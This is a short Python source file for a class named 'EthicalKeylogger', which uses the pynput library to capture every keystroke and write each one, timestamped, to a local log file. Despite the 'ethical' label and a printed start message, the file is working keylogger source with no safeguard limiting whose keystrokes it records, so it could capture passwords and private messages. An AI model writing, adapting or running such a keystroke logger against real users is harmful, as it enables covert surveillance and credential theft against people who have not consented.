from pynput import keyboard
from datetime import datetime
import os
from utils import setup_logging, create_log_file

class EthicalKeylogger:
    def __init__(self):
        self.log_dir = "logs"
        self.current_log = None
        setup_logging(self.log_dir)
        
    def on_press(self, key):
        try:
            if not self.current_log:
                self.current_log = create_log_file(self.log_dir)
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if hasattr(key, 'char'):
                key_char = key.char
            else:
                key_char = str(key)
            
            with open(self.current_log, 'a') as f:
                f.write(f"{timestamp}: {key_char}\n")
                
        except Exception as e:
            print(f"Error logging keystroke: {e}")
            
    def start(self):
        print("Starting keylogger in controlled environment...")
        print("Press Ctrl+C to exit")
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    logger = EthicalKeylogger()
    logger.start()
